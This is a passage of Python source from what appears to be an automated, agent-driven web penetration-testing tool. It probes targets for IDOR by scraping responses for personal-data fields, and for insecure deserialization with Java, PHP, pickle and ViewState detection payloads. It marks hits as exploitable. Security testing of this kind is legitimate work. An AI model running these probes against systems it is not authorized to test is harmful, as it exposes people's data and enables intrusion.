                                r'"address"',
                                r'"name":\s*"[^"]+"',
                            ]
                            
                            import re
                            for pattern in sensitive_patterns:
                                if re.search(pattern, response_text, re.IGNORECASE):
                                    vulnerable = True
                                    accessible_ids.append(test_id)
                                    results.append({
                                        "id": test_id,
                                        "status": status,
                                        "length": response_length,
                                        "pattern_found": pattern,
                                        "vulnerable": True
                                    })
                                    break
                    
            except Exception as e:
                logger.debug(f"IDOR test error for ID {test_id}: {e}")
    
    if vulnerable:
        logger.warning(f"IDOR vulnerability found on {target_url}")
        from core.state import VulnerabilityInfo
        parsed_url = urlparse(target_url)
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        service = parsed_url.scheme or "http"
        state.add_vulnerability(VulnerabilityInfo(
            vuln_id="IDOR",
            service=service,
            port=port,
            severity="high",
            exploitable=True
        ))
    
    return {
        "type": "IDOR",
        "target": target_url,
        "vulnerable": vulnerable,
        "accessible_ids": accessible_ids,
        "results": results
    }


# -------------------------
# Deserialization
# -------------------------
async def test_deserialization(
    state: "AgentState",
    target_url: str,
    parameter: str = "data",
    framework: str = "auto",
    timeout: int = 30
) -> Dict[str, Any]:
    """
    Test for insecure deserialization vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL
        parameter: Parameter accepting serialized data
        framework: Target framework (java, php, python, auto)
        timeout: Request timeout
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing deserialization on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    can_exploit, reason = check_exploit_preconditions(state, target_url, "deserialization")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    # Deserialization payloads by framework
    payloads = {
        "java": [
            # Ysoserial-like detection
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAABYXQAAWJ4",
        ],
        "php": [
            # PHP object injection
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;O:8:"stdClass":0:{}}',
        ],
        "python": [
            # Pickle detection
            "gASVCAAAAAAAAACMBHRlc3SULg==",  # Base64 pickle
        ],
        ".net": [
            # ViewState-like
            "/wEPDwUKLTEwNDU5ODU1OQ9kFgICAw9kFgICAQ8PFgIeBFRleHQFDUhlbGxvLCBXb3JsZCFkZGQ=",
        ]
    }
    
    results = []
    vulnerable = False
    detected_framework = None
    
    async with aiohttp.ClientSession() as session:
        frameworks_to_test = [framework] if framework != "auto" else list(payloads.keys())
        
        for fw in frameworks_to_test:
            if fw not in payloads:
                continue
            
            for payload in payloads[fw]:
                try:
                    # Try both GET and POST
                    async with session.post(
                        target_url,
                        data={parameter: payload},
                        timeout=aiohttp.ClientTimeout(total=timeout)
                    ) as resp:
                        response_text = await resp.text()
                        
                        # Check for deserialization indicators
                        indicators = [
                            "java.io.ObjectInputStream",
                            "unserialize()",
                            "pickle",
                            "ClassNotFoundException",
                            "InvalidClassException",
                            "__wakeup",
                            "__destruct",
                        ]
                        
                        for indicator in indicators:
                            if indicator.lower() in response_text.lower():
                                vulnerable = True
                                detected_framework = fw
                                results.append({
                                    "framework": fw,
                                    "payload": payload[:50] + "...",
                                    "indicator": indicator,
                                    "vulnerable": True
                                })
                                break
                
                except Exception as e:
                    logger.debug(f"Deserialization test error: {e}")
    
    if vulnerable:
        logger.warning(f"Deserialization vulnerability found on {target_url} ({detected_framework})")
        from core.state import VulnerabilityInfo
        parsed_url = urlparse(target_url)
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        service = parsed_url.scheme or "http"
        state.add_vulnerability(VulnerabilityInfo(
            vuln_id="DESERIALIZATION",
            service=service,
            port=port,
            severity="critical",
            exploitable=True
        ))
    
    return {
        "type": "Deserialization",
        "target": target_url,
        "vulnerable": vulnerable,
        "framework": detected_framework,
        "results": results
    }
